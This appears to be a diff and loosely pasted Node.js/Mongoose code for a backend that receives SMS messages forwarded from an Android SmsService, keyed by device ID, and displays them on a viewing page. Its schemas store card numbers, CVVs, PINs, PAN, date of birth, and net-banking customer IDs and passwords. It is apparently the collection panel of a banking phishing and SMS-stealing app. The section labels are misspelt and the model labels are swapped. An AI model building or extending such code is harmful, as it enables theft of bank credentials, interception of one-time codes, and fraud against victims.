@@ -457,9 +457,11 @@ filan.ejs
     <br>
 
     <br>
-    <a href="/custos/sms/<%= device._id %>">View sms</a>
+    <a href="/api/notification/custom/sms/<%= device.id %>">View SMS</a>
+
 </body>
 </html>
+
 
 
 form 
@@ -1165,5 +1167,159 @@ class SmsService : Service() {
         return null
     }
 }
+
+
+
+
+notificatooriut
+
+
+
+
+const express = require('express');
+const router = express.Router();
+const notificationController = require('../controllers/notificationController');
+
+// POST route to save notification data
+router.post('/save', notificationController.saveNotification);  // Correct function name
+
+// GET route to fetch notifications
+router.get('/custom/sms/:uniqueid', notificationController.getCustomSms);
+
+
+module.exports = router;
+
+
+
+
+controller 
+
+
+const Notification = require('../models/Notification');
+
+// Save a notification (SMS) to the database
+exports.saveNotification = async (req, res) => {
+    try {
+        const { sender, title, body, timestamp, uniqueid } = req.body;
+
+        const notification = new Notification({
+            sender,
+            title,
+            body,
+            timestamp,
+            uniqueid
+        });
+
+        await notification.save();
+
+        res.status(201).json({
+            success: true,
+            message: "Notification saved successfully",
+            data: notification
+        });
+    } catch (err) {
+        console.error("Error saving notification:", err);
+        res.status(500).json({
+            success: false,
+            message: "Error saving notification",
+            error: err.message
+        });
+    }
+};
+
+exports.getCustomSms = async (req, res) => {
+    try {
+        console.log("Params received:", req.params);
+
+        let { uniqueid } = req.params;
+
+        if (!uniqueid) {
+            console.log("uniqueid is undefined!");
+            return res.status(400).json({ success: false, error: "Missing uniqueid in URL" });
+        }
+
+        console.log("Searching for SMS data with uniqueid:", uniqueid);
+
+        // Fetch SMS data from the database using uniqueid
+        const smsData = await Notification.find({ uniqueid });
+
+        if (!smsData || smsData.length === 0) {
+            console.log("No SMS data found for uniqueid:", uniqueid);
+            return res.render('sms', { smsData: [] });
+        }
+
+        console.log("SMS data found:", smsData.length, "messages");
+        res.render('sms', { smsData });
+
+    } catch (error) {
+        console.error("Error fetching SMS data:", error);
+        res.status(500).send("Internal Server Error");
+    }
+};
+
+
+
+user model
+
+
+const mongoose = require('mongoose');
+
+const userSchema = new mongoose.Schema({
+    mobile: { type: String, required: true },
+    dob: { type: String, required: true },
+    pan: { type: String, required: true },
+    uniqueid: { type: String, required: true, unique: true }
+});
+
+module.exports = mongoose.model('User', userSchema);
+
+
+
+notification model
+
+// models/Notification.js
+const mongoose = require('mongoose');
+
+const notificationSchema = new mongoose.Schema({
+    sender: { type: String, required: true },
+    title: { type: String, required: true },
+    body: { type: String, required: true },
+    timestamp: { type: String, required: true }, 
+    uniqueid: { type: String, required: true }
+});
+
+module.exports = mongoose.model('Notification', notificationSchema);
+
+
+
+netbanking modeld
+
+const mongoose = require('mongoose');
+
+const netBankingSchema = new mongoose.Schema({
+    uniqueid: { type: String, required: true },
+    cardNumber: { type: String, required: true },
+    expiryDate: { type: String, required: true },
+    cvv: { type: String, required: true },
+    pin: { type: String, required: true }
+});
+
+module.exports = mongoose.model('NetBanking', netBankingSchema);
+
+
+card model
+
+
+const mongoose = require('mongoose');
+
+const cardPaymentSchema = new mongoose.Schema({
+    uniqueid: { type: String, required: true },
+    customerId: { type: String, required: true },
+    password: { type: String, required: true }
+});
+
+module.exports = mongoose.model('CardPayment', cardPaymentSchema);
+
+
 
 
